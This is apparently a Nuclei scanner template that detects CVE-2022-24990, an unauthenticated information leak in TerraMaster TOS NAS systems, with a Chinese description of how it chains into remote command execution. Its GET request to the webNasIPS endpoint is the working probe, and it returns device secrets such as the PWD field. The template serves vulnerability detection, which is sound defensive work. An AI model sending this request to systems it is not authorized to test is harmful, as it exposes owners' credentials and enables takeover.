id: CVE-2022-24990
info:
  name: TerraMaster TOS < 4.2.30 Server Information Disclosure
  author:
  - l0ne1y
  description: |-
    Terramaster TOS信息泄露可导致RCE漏洞
    Terramaster TOS是中国铁威马（Terramaster）公司的一款基于Linux平台的，专用于erraMaster云存储NAS服务器的操作系统。 Terramaster TOS 4.2.29版本存在命令注入漏洞，该漏洞源于api.php脚本中的webNasIPS 组件中的输入验证不正确。未经身份验证的攻击者可以发送特殊数据利用该漏洞并在目标系统上执行任意命令。 TerraMaster TOS `mobile.class.php`文件的`createRaid`方法存在远程命令执行漏洞 ，攻击者配合 `CVE-2022-24990` 漏洞可以获取服务器权限
  severity: medium
  remediation: |-
    #### 官方修复方案：
    目前厂商已经发布了升级补丁以修复这个安全问题，请到厂商的主页下载：
    [https://www.terra-master.com/cn/](https://www.terra-master.com/cn/)
requests:
- matchers:
  - type: status
    status:
    - 200
  - type: word
    condition: and
    part: header
    words:
    - application/json
    - TerraMaster
  - type: regex
    condition: or
    part: body
    regex:
    - webNasIPS successful
    - '(ADDR|(IFC|PWD|[DS]AT)):'
    - '"((firmware|(version|ma(sk|c)|port|url|ip))|hostname)":'
  matchers-condition: and
  path:
  - '{{BaseURL}}/module/api.php?mobile/webNasIPS'
  method: GET
  headers:
    User-Agent: TNAS
